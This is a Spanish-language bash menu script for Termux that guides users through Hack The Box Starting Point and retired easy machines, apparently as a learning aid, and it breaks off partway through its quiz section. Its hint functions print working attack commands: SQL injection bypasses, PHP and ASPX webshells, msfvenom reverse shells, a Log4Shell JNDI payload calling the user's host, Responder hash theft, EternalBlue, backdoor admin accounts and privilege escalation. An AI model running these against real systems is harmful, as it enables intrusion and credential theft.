#!/bin/sh
# Compatibilidad Termux/Linux: en Termux no existe /usr/bin/env.
if [ -z "${BASH_VERSION:-}" ]; then
  exec bash "$0" "$@"
fi

# ============================================================
#  MR.ROBOTTICO · HTB FÁCIL
#  Menú para la comunidad de Termux — máquinas Very Easy de HTB
#  Un solo archivo, sin instalación: bash MR.Robottico_facil.sh
#  Uso educativo: solo laboratorios HTB o sistemas propios.
# ============================================================

set -u

SELF="${BASH_SOURCE[0]}"
if command -v readlink >/dev/null 2>&1; then
  REAL="$(readlink -f "$SELF" 2>/dev/null || true)"
  [ -n "$REAL" ] && SELF="$REAL"
fi
BASE="$(cd -- "$(dirname -- "$SELF")" >/dev/null 2>&1 && pwd)"
NOTAS="$BASE/notas"
mkdir -p "$NOTAS"

# ------------------------------------------------------------
# Colores
# ------------------------------------------------------------
if [ -t 1 ]; then
  G=$'\033[1;32m'; C=$'\033[1;36m'; Y=$'\033[1;33m'
  R=$'\033[1;31m'; W=$'\033[1;37m'; D=$'\033[0;37m'; N=$'\033[0m'
else
  G=""; C=""; Y=""; R=""; W=""; D=""; N=""
fi

RHOST=""
AUTO=0

msg()   { printf '%s[*]%s %s\n' "$C" "$N" "$*"; }
ok()    { printf '%s[+]%s %s\n' "$G" "$N" "$*"; }
aviso() { printf '%s[!]%s %s\n' "$Y" "$N" "$*"; }
error() { printf '%s[-]%s %s\n' "$R" "$N" "$*"; }
tenue() { printf '    %s%s%s\n' "$D" "$*" "$N"; }
linea() { printf '%s  ────────────────────────────────────────────────────────%s\n' "$D" "$N"; }

pista() { printf '  %s\n' "$*"; }
paso()  { printf '  %s$ %s%s\n' "$D" "$*" "$N"; }

limpiar() { clear 2>/dev/null || printf '\033[2J\033[H'; }

pausa() {
  printf '\n  %sPulsa Enter para continuar...%s' "$D" "$N"
  IFS= read -r _ || true
}

banner() {
  limpiar
  printf '%s' "$G"
  cat <<'ART'
   ███╗   ███╗██████╗
   ████╗ ████║██╔══██╗
   ██╔████╔██║██████╔╝
   ██║╚██╔╝██║██╔══██╗
   ██║ ╚═╝ ██║██║  ██║
   ╚═╝     ╚═╝╚═╝  ╚═╝
ART
  printf '%s' "$N"
  printf '%s   MR.ROBOTTICO · HTB FÁCIL%s\n' "$W" "$N"
  printf '%s   comunidad Termux · %s%s\n\n' "$D" "$(date '+%Y-%m-%d %H:%M')" "$N"
}

# ------------------------------------------------------------
# Objetivo / IP local
# ------------------------------------------------------------
pedir_objetivo() {
  if [ -z "$RHOST" ]; then
    printf '  %sIP objetivo (HTB): %s' "$Y" "$N"
    IFS= read -r RHOST || true
  fi
  if [ -z "$RHOST" ]; then
    error "Necesito una IP (opción -t)"
    return 1
  fi
  return 0
}

ip_local() {
  local ip=""
  if command -v ip >/dev/null 2>&1; then
    ip=$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)
    if [ -z "$ip" ]; then
      ip=$(ip -4 -o addr show 2>/dev/null |
        awk '$2 !~ /^lo/ {print $4; exit}' | cut -d/ -f1)
    fi
  fi
  if [ -z "$ip" ] && command -v ifconfig >/dev/null 2>&1; then
    ip=$(ifconfig tun0 2>/dev/null | awk '/inet /{print $2; exit}')
    if [ -z "$ip" ]; then
      ip=$(ifconfig 2>/dev/null |
        awk '/^[a-zA-Z]/ {iface=$1} /inet / && iface !~ /^lo/ {print $2; exit}')
    fi
  fi
  printf '%s' "${ip:-TU_IP}"
}

lhost() { ip_local; }

# ------------------------------------------------------------
# Herramientas / ejecución
# ------------------------------------------------------------
sugerir() {
  local t="$1"
  if [ -n "${PREFIX:-}" ] && [ -d "$PREFIX" ]; then
    case "$t" in
      nmap | curl | wget | git | python | python3 | ssh | ftp | nano | openssh)
        tenue "Termux: pkg install $t" ;;
      nc | netcat)
        tenue "Termux: pkg install netcat-openbsd" ;;
      mysql | mysqladmin)
        tenue "Termux: pkg install mariadb" ;;
      redis-cli)
        tenue "Termux: pkg install redis" ;;
      sqlmap | aws)
        tenue "Termux: pip install $t" ;;
      gobuster | ffuf)
        tenue "Termux: pkg install $t" ;;
      smbclient | impacket-* | msfconsole | responder | zip2john | john)
        tenue "Requiere Kali: pkg install proot-distro && proot-distro install kali"
        tenue "  luego: proot-distro login kali && apt install $t" ;;
      *)
        tenue "Instala '$t' con: pkg install $t" ;;
    esac
  else
    tenue "Instala '$t' con el gestor de tu distro"
  fi
}

necesita() {
  local t
  local -a faltan=()
  for t in "$@"; do
    command -v "$t" >/dev/null 2>&1 || faltan+=("$t")
  done
  [ ${#faltan[@]} -eq 0 ] && return 0
  error "Falta: ${faltan[*]}"
  for t in "${faltan[@]}"; do
    sugerir "$t"
  done
  return 1
}

ejecutar() {
  local cmd="$1" r
  printf '\n  %s$ %s%s\n' "$D" "$cmd" "$N"
  if [ "$AUTO" -eq 1 ]; then
    bash -c "$cmd"
    return $?
  fi
  printf '  %s¿Ejecutar? [y/N]%s ' "$Y" "$N"
  IFS= read -r r || true
  case "$r" in
    y | Y | s | S) bash -c "$cmd" ;;
    *) tenue "(omitido)" ;;
  esac
}

# ------------------------------------------------------------
# Metadatos de las máquinas
# ------------------------------------------------------------
IDX=()
declare -A M_NAME M_TIER M_OS M_DIFF M_PORTS M_TAGS

add() {
  local id="$1"
  IDX+=("$id")
  M_NAME[$id]="$2"
  M_TIER[$id]="$3"
  M_OS[$id]="$4"
  M_DIFF[$id]="$5"
  M_PORTS[$id]="$6"
  M_TAGS[$id]="$7"
}

add meow        "Meow"        "Starting Point · Tier 0" "Linux"   "Very Easy" "23/tcp"            "telnet · credenciales por defecto"
add fawn        "Fawn"        "Starting Point · Tier 0" "Linux"   "Very Easy" "21/tcp"            "ftp · login anónimo"
add dancing     "Dancing"     "Starting Point · Tier 0" "Windows" "Very Easy" "445/tcp"           "smb · null session"
add redeemer    "Redeemer"    "Starting Point · Tier 0" "Linux"   "Very Easy" "6379/tcp"          "redis · sin auth"
add appointment "Appointment" "Starting Point · Tier 1" "Linux"   "Very Easy" "80/tcp"            "web · sqli · login bypass"
add sequel      "Sequel"      "Starting Point · Tier 1" "Linux"   "Very Easy" "3306/tcp"          "mysql · root sin password"
add crocodile   "Crocodile"   "Starting Point · Tier 1" "Linux"   "Very Easy" "21,80/tcp"         "ftp anónimo · web · upload"
add responder   "Responder"   "Starting Point · Tier 1" "Windows" "Very Easy" "80/tcp"            "ntlm · responder · lfi"
add three       "Three"       "Starting Point · Tier 1" "Linux"   "Very Easy" "80/tcp"            "aws · s3 · bucket"
add ignition    "Ignition"    "Starting Point · Tier 1" "Linux"   "Very Easy" "80/tcp"            "magento · creds default"
add archetype   "Archetype"   "Starting Point · Tier 2" "Windows" "Very Easy" "445,1433/tcp"      "smb · mssql · psexec"
add oopsie      "Oopsie"      "Starting Point · Tier 2" "Linux"   "Very Easy" "22,80/tcp"         "upload · suid · path hijack"
add vaccine     "Vaccine"     "Starting Point · Tier 2" "Linux"   "Very Easy" "21,22,80/tcp"      "ftp · zip · sqli · sudo vi"
add unified     "Unified"     "Starting Point · Tier 2" "Linux"   "Very Easy" "8443/tcp"          "log4j · log4shell"
add jerry       "Jerry"       "Retirada · Easy"         "Windows" "Easy"      "8080/tcp"          "tomcat · manager · war"
add blue        "Blue"        "Retirada · Easy"         "Windows" "Easy"      "445/tcp"           "ms17-010 · eternalblue"
add buff        "Buff"        "Retirada · Easy"         "Windows" "Easy"      "8080/tcp"          "upload · cloudme"
add netmon      "Netmon"      "Retirada · Easy"         "Windows" "Easy"      "21,80,5985/tcp"    "prtg · rce · winrm"
add devel       "Devel"       "Retirada · Easy"         "Windows" "Easy"      "21,80/tcp"         "ftp escribible · aspx"

# ------------------------------------------------------------
# Reto: preguntas + flag
# ------------------------------------------------------------
QUIZ_OK=0
QUIZ_TOTAL=0
QUIZ_FALLOS=0

pregunta() {
  local texto="$1" correcta="$2"
  shift 2
  local -a ops=("$correcta" "$@")
  local n=${#ops[@]} i j t k r correcto_idx=0
  local -a idx=()
  for ((i = 0; i < n; i++)); do idx+=("$i"); done
  for ((i = n - 1; i > 0; i--)); do
    j=$((RANDOM % (i + 1)))
    t=${idx[i]}
    idx[i]=${idx[j]}
    idx[j]=$t
  done

  QUIZ_TOTAL=$((QUIZ_TOTAL + 1))
  printf '\n  %s%s%s\n' "$W" "$texto" "$N"
  for ((i = 0; i < n; i++)); do
    k=${idx[i]}
    [ "$k" -eq 0 ] && correcto_idx=$((i + 1))
    printf '    %s%d)%s %s\n' "$C" "$((i + 1))" "$N" "${ops[$k]}"
  done
  printf '  Respuesta > '
  IFS= read -r r || true
  if [[ "$r" =~ ^[0-9]+$ ]] && [ "$r" -eq "$correcto_idx" ]; then
    ok "¡Correcto!"
    QUIZ_OK=$((QUIZ_OK + 1))
  else
    error "No. La correcta era: $correcto_idx) $correcta"
    QUIZ_FALLOS=$((QUIZ_FALLOS + 1))
  fi
}

crear_notas() {
  local id="$1" f="$NOTAS/$id.md"
  [ -f "$f" ] && return 0
  {
    printf '# %s (%s)\n\n' "${M_NAME[$id]}" "${M_DIFF[$id]}"
    printf -- '- IP: %s\n' "${RHOST:-?}"
    printf -- '- Fecha: %s\n' "$(date '+%Y-%m-%d %H:%M')"
    printf -- '- Puertos: %s\n' "${M_PORTS[$id]}"
    printf -- '- Tier: %s\n\n' "${M_TIER[$id]}"
    printf '## Enumeración\n\n\n## Credenciales\n\n\n## Flags\n\n'
  } >"$f"
  ok "Notas creadas: $f"
}

guardar_progreso() {
  local id="$1" p="$BASE/progreso.md"
  [ -f "$p" ] || printf '# Progreso · HTB Fácil\n\n' >"$p"
  grep -qF -- "- [x] ${M_NAME[$id]}" "$p" 2>/dev/null && return 0
  printf -- '- [x] %s — %s\n' "${M_NAME[$id]}" "$(date '+%Y-%m-%d')" >>"$p"
}

pedir_flag() {
  local id="$1" f flag
  crear_notas "$id" >/dev/null
  f="$NOTAS/$id.md"
  printf '\n  %sÚltima prueba: pega la flag de %s%s\n' "$Y" "${M_NAME[$id]}" "$N"
  printf '  Flag (Enter para saltar) > '
  IFS= read -r flag || true
  if [ -z "$flag" ]; then
    aviso "Sin flag: la máquina no se marca como completada."
    return 0
  fi
  if grep -q '^- flag:' "$f" 2>/dev/null; then
    sed -i "s|^- flag:.*|- flag: $flag|" "$f"
  else
    printf -- '- flag: %s  (%s)\n' "$flag" "$(date '+%Y-%m-%d')" >>"$f"
  fi
  guardar_progreso "$id"
  ok "Flag guardada en $f"
}

resumen_quiz() {
  local id="$1"
  printf '\n'
  linea
  printf '  Aciertos: %s%s/%s%s   Fallos: %s%s%s\n' \
    "$G" "$QUIZ_OK" "$QUIZ_TOTAL" "$N" "$R" "$QUIZ_FALLOS" "$N"
  if [ "$QUIZ_FALLOS" -eq 0 ]; then
    ok "Perfecto: dominas esta máquina."
  else
    aviso "Repasa las pistas (opción 2) y vuelve a intentarlo."
  fi
  linea
  pedir_flag "$id"
}

# ------------------------------------------------------------
# Módulos: recon y pistas
# ------------------------------------------------------------
rm_meow_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  pista "Con el puerto 23 abierto ya tienes la pista principal."
}
rm_meow_pistas() {
  msg "Meow — Telnet sin autenticación"
  pista "Telnet (23) permite entrar como root sin contraseña."
  paso "telnet $RHOST"
  pista "login: root   ·   password: (solo Enter)"
  pista "Dentro: ls -la && cat flag.txt"
  pista ""
  pista "Sin telnet instalado:  nc $RHOST 23"
}

rm_fawn_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  pista "Fíjate en el banner de FTP y el login anónimo."
}
rm_fawn_pistas() {
  msg "Fawn — FTP anónimo"
  pista "El servidor FTP permite el usuario 'anonymous' sin contraseña."
  paso "ftp $RHOST"
  pista "usuario: anonymous   ·   password: (solo Enter)"
  pista "Dentro: ls → get flag.txt → bye"
  pista ""
  pista "Sin cliente FTP:"
  paso "curl -s \"ftp://anonymous:@$RHOST/flag.txt\""
}

rm_dancing_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "nmap -Pn -p445 --script smb-enum-shares,smb-enum-users $RHOST"
  pista "Si no tienes smbclient, mira la opción [H] Herramientas."
}
rm_dancing_pistas() {
  msg "Dancing — SMB con sesión nula"
  pista "Enumera los recursos compartidos sin credenciales:"
  paso "smbclient -L //$RHOST -N"
  pista "Verás el share 'WorkShares'. Entra sin contraseña:"
  paso "smbclient //$RHOST/WorkShares -N"
  pista "Dentro: ls → cd James.P → get flag.txt → exit"
  pista ""
  pista "Todo en un comando:"
  paso "smbclient //$RHOST/WorkShares -N -c 'ls; cd James.P; get flag.txt'"
}

rm_redeemer_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  pista "Redis suele responder a 'info' sin contraseña."
}
rm_redeemer_pistas() {
  msg "Redeemer — Redis sin autenticación"
  pista "Conéctate al servidor Redis (sin password):"
  paso "redis-cli -h $RHOST"
  pista "Dentro: info → keys * → get flag"
  pista ""
  pista "Todo en un comando:"
  paso "redis-cli -h $RHOST --scan"
  paso "redis-cli -h $RHOST get flag"
}

rm_appointment_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "curl -s -i http://$RHOST/ | head -n 40"
  pista "Es un formulario de login. Prueba el bypass de SQLi."
}
rm_appointment_pistas() {
  msg "Appointment — SQL injection en el login"
  pista "Abre la web y mira el formulario:"
  paso "curl -s http://$RHOST/ | head -n 50"
  pista ""
  pista "Bypass clásico en el campo usuario:"
  paso "usuario: admin' or 1=1-- -"
  paso "password: cualquiera"
  pista "La flag aparece en el panel tras el login."
  pista ""
  pista "Con sqlmap (Kali):"
  paso "sqlmap -u 'http://$RHOST/' --forms --batch --dbs"
}

rm_sequel_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "nmap -Pn -p3306 --script mysql-info $RHOST"
  pista "MySQL acepta root sin contraseña."
}
rm_sequel_pistas() {
  msg "Sequel — MySQL con root sin contraseña"
  pista "Conéctate sin password:"
  paso "mysql -h $RHOST -u root"
  pista ""
  pista "Dentro:"
  paso "show databases;"
  paso "use htb;"
  paso "show tables;"
  paso "select * from users;"
  paso "select * from config;"
  pista ""
  pista "Sin cliente MySQL:"
  paso "nmap -Pn -p3306 --script mysql-dump --script-args='mysql.username=root' $RHOST"
}

rm_crocodile_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirb/common.txt -t 40"
  pista "FTP anónimo + panel de login en la web."
}
rm_crocodile_pistas() {
  msg "Crocodile — FTP anónimo → login web → upload"
  pista "1) Saca las listas de credenciales del FTP anónimo:"
  paso "ftp $RHOST      # anonymous / vacío"
  paso "ls"
  paso "get allowed.userlist allowed.userlist.passwd"
  pista "Credenciales:  arron : P4ssw0rd"
  pista ""
  pista "2) Login en la web:  http://$RHOST/login.php"
  paso "usuario: arron   ·   password: P4ssw0rd"
  pista ""
  pista "3) Sube una reverse shell PHP desde el panel:"
  paso "cp /usr/share/webshells/php/php-reverse-shell.php shell.php"
  pista "Edita IP/puerto dentro de shell.php y pon a escuchar:"
  paso "nc -lvnp 4444"
  paso "curl http://$RHOST/uploads/shell.php"
  pista ""
  pista "4) Como www-data, enumera la escalada:"
  paso "sudo -l; find / -perm -4000 -type f 2>/dev/null; ls -la /var/spool/cron"
}

rm_responder_recon() {
  necesita nmap curl || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "curl -s -i --resolve unika.htb:80:$RHOST http://unika.htb/ | head -n 40"
  pista "El parámetro 'page' parece incluir ficheros (LFI/RFI)."
}
rm_responder_pistas() {
  msg "Responder — robar hash NTLM por SMB"
  pista "Termux no edita /etc/hosts sin root: usa --resolve."
  paso "curl --resolve unika.htb:80:$RHOST http://unika.htb/"
  pista ""
  pista "1) Lanza Responder en Kali/proot sobre tu interfaz:"
  paso "responder -I tun0 -wv"
  pista "2) Fuerza al servidor a autenticarse contra tu SMB:"
  paso "curl --resolve unika.htb:80:$RHOST 'http://unika.htb/index.php?page=//$(lhost)/share'"
  pista "3) Crackea el hash capturado:"
  paso "john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"
  pista "4) Entra con las credenciales de Administrator:"
  paso "evil-winrm -i $RHOST -u administrator -p 'CONTRASEÑA'"
  pista "o:  impacket-psexec administrator:'CONTRASEÑA'@$RHOST"
}

rm_three_recon() {
  necesita nmap curl || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "curl -s -i --resolve thetoppers.htb:80:$RHOST http://thetoppers.htb/ | head -n 40"
  ejecutar "curl -s --resolve s3.thetoppers.htb:80:$RHOST http://s3.thetoppers.htb/ | head -n 40"
  pista "Hay dos hosts: la web y un endpoint S3 (MinIO)."
}
rm_three_pistas() {
  msg "Three — bucket S3 y webshell"
  pista "Termux no edita /etc/hosts: usa --resolve en cada petición."
  paso "curl --resolve thetoppers.htb:80:$RHOST http://thetoppers.htb/"
  paso "curl --resolve s3.thetoppers.htb:80:$RHOST http://s3.thetoppers.htb/"
  pista ""
  pista "1) Configura credenciales dummy y lista el bucket:"
  paso "export AWS_ACCESS_KEY_ID=x AWS_SECRET_ACCESS_KEY=x"
  paso "aws --endpoint-url http://s3.thetoppers.htb s3 ls"
  paso "aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb"
  pista ""
  pista "2) Sube una webshell PHP al bucket (el sitio la sirve):"
  paso "echo '<?php system(\$_GET[\"cmd\"]); ?>' > shell.php"
  paso "aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb"
  pista ""
  pista "3) Ejecuta comandos:"
  paso "curl --resolve thetoppers.htb:80:$RHOST 'http://thetoppers.htb/shell.php?cmd=id'"
  pista "La flag está en /var/www/."
}

rm_ignition_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirb/common.txt -t 40"
  pista "Busca el panel de administración de Magento."
}
rm_ignition_pistas() {
  msg "Ignition — Magento con credenciales por defecto"
  pista "1) Fuerza directorios y localiza /admin:"
  paso "gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirb/common.txt"
  paso "curl -s http://$RHOST/admin | head -n 40"
  pista ""
  pista "2) Credenciales por defecto:"
  paso "usuario: admin   ·   password: qwerty123"
  pista ""
  pista "3) La flag está dentro del panel de administración."
  pista "Si no carga /admin, prueba http://$RHOST/index.php/admin"
}

rm_archetype_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "nmap -Pn -p445,1433 --script smb-enum-shares,ms-sql-info $RHOST"
  pista "SMB con sesión nula + MSSQL."
}
rm_archetype_pistas() {
  msg "Archetype — SMB → MSSQL → psexec"
  pista "1) Enumera SMB sin credenciales:"
  paso "smbclient -N -L //$RHOST"
  paso "smbclient -N //$RHOST/backups"
  paso "smbclient -N //$RHOST/backups -c 'ls; get prod.dtsConfig'"
  pista ""
  pista "2) El .dtsConfig filtra credenciales MSSQL:  sql_svc : M3g4c0rp123"
  paso "impacket-mssqlclient ARCHETYPE/sql_svc:'M3g4c0rp123'@$RHOST -windows-auth"
  pista ""
  pista "3) Activa xp_cmdshell y lee la flag de usuario:"
  paso "EXEC xp_cmdshell 'whoami';"
  paso "EXEC xp_cmdshell 'type C:\\Users\\sql_svc\\Desktop\\user.txt';"
  pista ""
  pista "4) Escalada: revisa el historial de PowerShell:"
  paso "EXEC xp_cmdshell 'type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt';"
  pista "Ahí aparece la contraseña de Administrator. Entra con psexec:"
  paso "impacket-psexec administrator:'MEGACORP_4dm1n!!'@$RHOST"
  paso "type C:\\Users\\Administrator\\Desktop\\root.txt"
}

rm_oopsie_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirb/common.txt -t 40"
  pista "Hay una aplicación web con subida de ficheros."
}
rm_oopsie_pistas() {
  msg "Oopsie — upload de webshell + SUID + PATH"
  pista "1) Sube una reverse shell PHP. Si filtra extensión, cambia el"
  pista "   nombre con Burp (shell.php) y el Content-Type a image/jpeg."
  paso "nc -lvnp 4444"
  paso "curl http://$RHOST/uploads/shell.php"
  pista ""
  pista "2) Ya como www-data, busca binarios SUID:"
  paso "find / -perm -4000 -type f 2>/dev/null"
  pista ""
  pista "3) /usr/bin/bugtracker llama a 'cat' desde PATH: secuestra PATH."
  paso "cd /tmp && echo '/bin/bash' > cat && chmod +x cat"
  paso "export PATH=/tmp:\$PATH"
  paso "/usr/bin/bugtracker"
  pista ""
  pista "4) Eres root:"
  paso "cat /root/root.txt"
  pista "Flag de usuario: /home/robert/user.txt (o busca user.txt)."
}

rm_vaccine_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirb/common.txt -t 40"
  pista "FTP anónimo con un backup.zip."
}
rm_vaccine_pistas() {
  msg "Vaccine — FTP → zip → SQLi → sudo vi"
  pista "1) Descarga el backup por FTP anónimo:"
  paso "ftp $RHOST      # anonymous / vacío"
  paso "get backup.zip"
  pista ""
  pista "2) Rompe la contraseña del zip:"
  paso "zip2john backup.zip > zip.hash"
  paso "john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt"
  pista "Password del zip: 741852963"
  paso "unzip backup.zip     # index.php con un hash MD5"
  pista "El hash 2cb42f8734ea607eefed3b70af13bbd3 → qwerty789"
  pista ""
  pista "3) Login en http://$RHOST con admin:qwerty789"
  pista "El buscador es inyectable:"
  paso "sqlmap -u 'http://$RHOST/dashboard.php?search=x' --cookie 'PHPSESSID=...' --batch --os-shell"
  pista ""
  pista "4) Escalada con sudo:"
  paso "sudo -l      # (ALL) /bin/vi"
  paso "sudo vi      # dentro:  :!/bin/bash"
  paso "cat /root/root.txt"
}

rm_unified_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "curl -sk -i https://$RHOST:8443/ | head -n 30"
  pista "UniFi en 8443. Versión vulnerable a Log4Shell."
}
rm_unified_pistas() {
  msg "Unified — Log4Shell en UniFi"
  pista "Necesitas Java: en Termux usa proot Kali (apt install default-jdk)."
  paso "proot-distro login kali"
  pista ""
  pista "1) Levanta el exploit (log4j-shell-poc o rogue-jndi):"
  paso "python3 poc.py --userip $(lhost) --webport 8000 --lport 4444"
  paso "nc -lvnp 4444"
  pista ""
  pista "2) Intercepta el login de https://$RHOST:8443 y envía en 'remember':"
  paso '{"username":"x","password":"x","remember":"${jndi:ldap://TU_IP:1389/x}"}'
  pista ""
  pista "3) Recibirás una shell root directa:"
  paso "cat /root/root.txt"
}

rm_jerry_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "curl -s -i http://$RHOST:8080/ | head -n 30"
  pista "Tomcat con el manager expuesto."
}
rm_jerry_pistas() {
  msg "Jerry — Tomcat Manager → WAR"
  pista "1) Credenciales por defecto de Tomcat:"
  paso "tomcat : s3cret"
  pista "Panel:  http://$RHOST:8080/manager/html"
  pista ""
  pista "2) Genera y despliega un WAR malicioso:"
  paso "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$(lhost) LPORT=4444 -f war -o rev.war"
  paso "nc -lvnp 4444"
  paso "curl -u tomcat:s3cret --upload-file rev.war 'http://$RHOST:8080/manager/text/deploy?path=/rev'"
  paso "curl http://$RHOST:8080/rev/"
  pista ""
  pista "3) Ambas flags están en:"
  paso "C:\\Users\\Administrator\\Desktop\\flags\\2 for the price of 1.txt"
  pista "Alternativa con Metasploit:"
  paso "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS $RHOST; set HttpUsername tomcat; set HttpPassword s3cret; set LHOST $(lhost); run'"
}

rm_blue_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "nmap -Pn -p445 --script smb-vuln-ms17-010 $RHOST"
  pista "Si sale VULNERABLE, tienes EternalBlue."
}
rm_blue_pistas() {
  msg "Blue — MS17-010 (EternalBlue)"
  pista "Necesita una VM Windows 7 con SMBv1 y Metasploit (Kali/proot)."
  pista ""
  pista "1) Comprueba la vulnerabilidad:"
  paso "nmap -Pn -p445 --script smb-vuln-ms17-010 $RHOST"
  pista ""
  pista "2) Explota con Metasploit:"
  paso "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $RHOST; set LHOST $(lhost); set PAYLOAD windows/x64/meterpreter/reverse_tcp; run'"
  pista ""
  pista "3) En meterpreter:"
  paso "hashdump"
  paso "cat C:/Users/Administrator/Desktop/root.txt"
  pista "Flag de usuario: C:/Users/Administrator/Desktop/user.txt (o busca user.txt)."
  pista ""
  pista "Alternativa sin Metasploit: AutoBlue-MS17-010 (Python + impacket)."
}

rm_buff_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "curl -s -i http://$RHOST:8080/ | head -n 30"
  pista "Gym Management System en el 8080."
}
rm_buff_pistas() {
  msg "Buff — Gym Management → CloudMe"
  pista "1) La web del gimnasio tiene un upload vulnerable:"
  paso "searchsploit gym management"
  paso "python3 48506.py http://$RHOST:8080/"
  pista "También puedes subir una webshell a mano con /upload.php."
  pista "Obtienes shell como buff\\shaun → user.txt"
  paso "type C:\\Users\\shaun\\Desktop\\user.txt"
  pista ""
  pista "2) Escalada: CloudMe 1.11.2 escucha solo en localhost:8888."
  pista "Abre un túnel con chisel (sube chisel.exe a la víctima):"
  paso "chisel server -p 8000 --reverse        # en tu Kali"
  paso "chisel.exe client $(lhost):8000 R:8888:127.0.0.1:8888"
  pista ""
  pista "3) Genera shellcode y lanza el exploit de CloudMe:"
  paso "msfvenom -p windows/shell_reverse_tcp LHOST=$(lhost) LPORT=4444 -f python -o sc.txt"
  paso "searchsploit -m 48389   # ajusta el shellcode y ejecuta contra 127.0.0.1:8888"
  paso "nc -lvnp 4444"
  pista "Root: type C:\\Users\\Administrator\\Desktop\\root.txt"
}

rm_netmon_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "nmap -Pn -p21,80,445 --script ftp-anon,http-title $RHOST"
  pista "FTP anónimo + PRTG Network Monitor en el 80."
}
rm_netmon_pistas() {
  msg "Netmon — PRTG + notificación RCE"
  pista "1) Entra al FTP anónimo y busca la config de PRTG:"
  paso "ftp $RHOST      # anonymous / vacío"
  paso "ls; cd ProgramData/Paessler/PRTG Network Monitor; ls"
  paso "get \"PRTG Configuration.old.bak\""
  pista "Dentro hay credenciales antiguas: prtgadmin:PrTg@dmin2018"
  pista "Prueba la del año siguiente en el panel:"
  paso "http://$RHOST  →  prtgadmin : PrTg@dmin2019"
  pista ""
  pista "2) RCE con notificaciones (Setup → Account Settings → Notifications):"
  pista "   Add notification → Execute Program → PowerShell:"
  paso "net user pirata Passw0rd! /add; net localgroup administrators pirata /add"
  pista "Crea la notificación y lánzala con 'Send test notification'."
  pista ""
  pista "3) Entra por WinRM:"
  paso "evil-winrm -i $RHOST -u pirata -p 'Passw0rd!'"
  pista "Flags: C:\\Users\\Public\\Desktop\\user.txt y"
  paso "C:\\Users\\Administrator\\Desktop\\root.txt"
}

rm_devel_recon() {
  necesita nmap || return
  ejecutar "nmap -sV -Pn -p- --min-rate 2000 $RHOST"
  ejecutar "nmap -Pn -p21 --script ftp-anon,ftp-write $RHOST"
  pista "FTP anónimo con permiso de escritura + IIS."
}
rm_devel_pistas() {
  msg "Devel — FTP escribible → webshell ASPX"
  pista "1) El FTP anónimo escribe en el webroot de IIS:"
  paso "ftp $RHOST      # anonymous / vacío"
  paso "pwd; ls          # C:\\inetpub\\wwwroot"
  pista "Sube una webshell .aspx:"
  paso "msfvenom -p windows/shell_reverse_tcp LHOST=$(lhost) LPORT=4444 -f aspx -o shell.aspx"
  paso "put shell.aspx"
  paso "nc -lvnp 4444"
  paso "curl http://$RHOST/shell.aspx"
  pista ""
  pista "2) Escalada (Windows 7 x86, SeImpersonate):"
  paso "whoami /priv"
  pista "Sube PrintSpoofer / JuicyPotato y ejecútalo:"
  paso "PrintSpoofer.exe -i -c cmd"
  pista "o usa MS11-046 / windows-exploit-suggester."
  pista ""
  paso "type C:\\Users\\babis\\Desktop\\user.txt"
  paso "type C:\\Users\\Administrator\\Desktop\\root.txt"
}

# ------------------------------------------------------------
# Retos por máquina (preguntas + flag)
# ------------------------------------------------------------
rm_meow_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Meow"
  pregunta "¿Qué servicio es la vía de entrada?" "Telnet (23)" "FTP (21)" "SMB (445)" "Redis (6379)"
  pregunta "¿Con qué credenciales se entra?" "root sin contraseña" "admin:admin" "anonymous" "tomcat:s3cret"
  pregunta "¿Qué comando usas?" "telnet $RHOST" "ssh root@$RHOST" "ftp $RHOST" "nc -lvnp 4444"
  resumen_quiz "meow"
}

rm_fawn_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Fawn"
